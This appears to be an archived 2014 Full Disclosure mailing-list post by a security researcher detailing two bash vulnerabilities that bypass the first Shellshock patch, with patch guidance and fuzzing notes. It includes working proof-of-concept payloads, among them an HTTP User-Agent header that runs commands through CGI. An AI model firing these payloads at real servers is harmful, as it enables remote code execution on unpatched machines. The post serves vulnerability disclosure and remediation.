@@ -1,0 +1,202 @@
+
+Date: Wed, 1 Oct 2014 07:21:34 -0700
+From: Michal Zalewski <lcamtuf@...edump.cx>
+To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>
+Subject: [FD] the other bash RCEs (CVE-2014-6277 and CVE-2014-6278)
+
+Good morning! This is kinda long.
+
+== Background ==
+
+If you are not familiar with the original bash function export
+vulnerability (CVE-2014-6271), you may want to have a look at this
+article:
+
+http://lcamtuf.blogspot.com/2014/09/quick-notes-about-bash-bug-its-impact.html
+
+Well, long story short: the initial maintainer-provided patch for this
+issue [1] (released on September 24) is *conclusively* broken.
+
+After nagging people to update for a while [5] [7], I wanted to share
+the technical details of two previously non-public issues which may be
+used to circumvent the original patch: CVE-2014-6277 and
+CVE-2014-6278.
+
+Note that the issues discussed here are separate from the three
+probably less severe problems publicly disclosed earlier on: Tavis'
+limited-exploitability EOL bug (CVE-2014-7169) and two likely
+non-exploitable one-off issues found by Florian Weimer and Todd Sabin
+(CVE-2014-7186 and CVE-2014-7187).
+
+== Required actions ==
+
+If you have installed just the September 24 patch [1], or that and the
+follow-up September 26 patch for CVE-2014-7169 [2], you are likely
+still vulnerable to RCE and need to update ASAP, as discussed in [5].
+
+You are safe if you have installed the unofficial function prefix
+patch from Florian Weimer [3], or its upstream variant released on
+September 28 [4]. The patch does not eliminate the problems, but
+shields the underlying parser from untrusted inputs under normal
+circumstances.
+
+Note: over the past few days, Florian's patch has been picked up by
+major Linux distros (Red Hat, Debian, SUSE, etc), so there is a
+reasonable probability that you are in good shape. To test, execute
+this command from within a bash shell:
+
+foo='() { echo not patched; }' bash -c foo
+
+If you see "not patched", you probably want upgrade immediately. If
+you see "bash: foo: command not found", you're OK.
+
+== Vulnerability details: CVE-2014-6277 (the more involved one) ==
+
+The following function definition appearing in the value of any
+environmental variable passed to bash will lead to an attempt to
+dereference attacker-controlled pointers (provided that the targeted
+instance of bash is protected only with the original patches [1][2]
+and does not include Florian's fix):
+
+() { x() { _; }; x() { _; } <<a; }
+
+A more complete example leading to a deref of 0x41414141 would be:
+
+HTTP_COOKIE="() { x() { _; }; x() { _; } <<`perl -e '{print
+"A"x1000}'`; }" bash -c :
+
+bash[25662]: segfault at 41414141 ip 00190d96 sp bfbe6354 error 4 in
+libc-2.12.so[110000+191000]
+
+(If you are seeing 0xdfdfdfdf, see note later on).
+
+The issue is caused by an uninitialized here_doc_eof field in a REDIR
+struct originally created in make_redirection(). The initial segv will
+happen due to an attempt to read and then copy a string to a new
+buffer through a macro that expands to:
+
+strcpy (xmalloc (1 + strlen (redirect->here_doc_eof)), (redirect->here_doc_eof))
+
+This appears to be exploitable in at least one way: if here_doc_eof is
+chosen by the attacker to point in the vicinity of the current stack
+pointer, the apparent contents of the string - and therefore its
+length - may change between stack-based calls to xmalloc() and
+strcpy() as a natural consequence of an attempt to pass parameters and
+create local variables. Such a mid-macro switch will result in an
+out-of-bounds write to the newly-allocated memory.
+
+A simple conceptual illustration of this attack vector would be:
+
+-- snip! --
+char* result;
+int len_alloced;
+
+main(int argc, char** argv) {
+
+  /* The offset will be system- and compiler-specific */;
+  char* ptr = &ptr - 9;
+
+  result = strcpy (malloc(100 + (len_alloced = strlen(ptr))), ptr);
+
+  printf("requested memory = %d\n"
+         "copied text = %d\n", len_alloced + 1, strlen(result) + 1);
+
+}
+-- snip! --
+
+When compiled with the -O2 flag used for bash, on one test system,
+this produces:
+
+requested memory = 2
+copied text = 28
+
+This can lead to heap corruption, with multiple writes possible per
+payload by simply increasing the number of malformed here-docs. The
+consequences should be fairly clear.
+
+[ There is also a latter call to free() on here_doc_eof in
+dispose_cmd.c, but because of the simultaneous discovery of the much
+simpler bug '78 discussed in the next section, I have not spent a
+whole lot of time trying to figure out how to get to that path. ]
+
+Perhaps notably, the ability to specify attacker-controlled addresses
+hinges on the state of --enable-bash-malloc and --enable-mem-scramble
+compile-time flags; if both are enabled, the memory returned by
+xmalloc() will be initialized to 0xdf, making the prospect of
+exploitation more speculative (essentially depending on whether the
+stack or any other memory region can be grown to overlap with
+0xdfdfdfdf). That said, many Linux distributions disable one or both
+flags and are vulnerable out-of-the-box. It is also of note that
+relatively few distributions compile bash as PIE, so there is little
+consolation to be found in ASLR.
+
+Similarly to the original vulnerability, this issue can be usually
+triggered remotely through web servers such as Apache (provided that
+they invoke CGI scripts or PHP / Python / Perl / C / Java servlets
+that rely on system() or popen()-type libcalls); through DHCP clients;
+and through some MUAs and MTAs. For a more detailed discussion of the
+exposed attack surface, refer to [6].
+
+== Vulnerability details: CVE-2014-6278 (the "back to the '90s" one) ==
+
+The following function definition appearing in the value of any
+environmental variable passed to bash 4.2 or 4.3 will lead to
+straightforward put-your-command-here RCE (again, provided that the
+targeted instance is not protected with Florian's patch):
+
+() { _; } >_[$($())] { echo hi mom; id; }
+
+A complete example looks like this:
+
+HTTP_COOKIE='() { _; } >_[$($())] { echo hi mom; id; }' bash -c :
+
+...or:
+
+GET /some/script.cgi HTTP/1.0
+User-Agent: () { _; } >_[$($())] { id >/tmp/hi_mom; }
+
+Note that the PoC does not work as-is in more ancient versions of
+bash, such as 2.x or 3.x; it might have been introduced with
+xparse_dolparen() starting with bash 4.2 patch level 12 few years
+back, but I have not investigated this in a lot of detail. Florian's
+patch is strongly recommended either way.
+
+The attack surface through which this flaw may be triggered is roughly
+similar to that for CVE-2014-6277 and the original bash bug [6].
+
+== Additional info ==
+
+Both of these issues were identified in an automated fashion with
+american fuzzy lop:
+
+https://code.google.com/p/american-fuzzy-lop
+
+The out-of-the-box fuzzer was seeded with a minimal valid function
+definition ("() { foo() { foo; }; >bar; }") and allowed to run for a
+couple of hours on a single core.
+
+In addition to the issues discussed above, the fuzzer also hit three
+of the four previously-reported CVEs.
+
+I initially shared the findings privately with vendors, but because of
+the intense scrutiny that this codebase is under, the ease of
+reproducing these results with an open-source fuzzer, and the
+now-broad availability of upstream mitigations, there seems to be
+relatively little value in continued secrecy.
+
+== References ==
+
+[1] http://ftp.gnu.org/gnu/bash/bash-4.3-patches/bash43-025
+[2] http://ftp.gnu.org/gnu/bash/bash-4.3-patches/bash43-026
+[3] http://www.openwall.com/lists/oss-security/2014/09/25/13
+[4] http://ftp.gnu.org/gnu/bash/bash-4.3-patches/bash43-027
+[5] http://lcamtuf.blogspot.com/2014/09/bash-bug-apply-unofficial-patch-now.html
+[6] http://lcamtuf.blogspot.com/2014/09/quick-notes-about-bash-bug-its-impact.html
+[7] http://www.pcworld.com/article/2688932/improved-patch-tackles-new-shellshock-attack-vectors.html
+
+PS. There are no other bugs in bash.
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+http://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
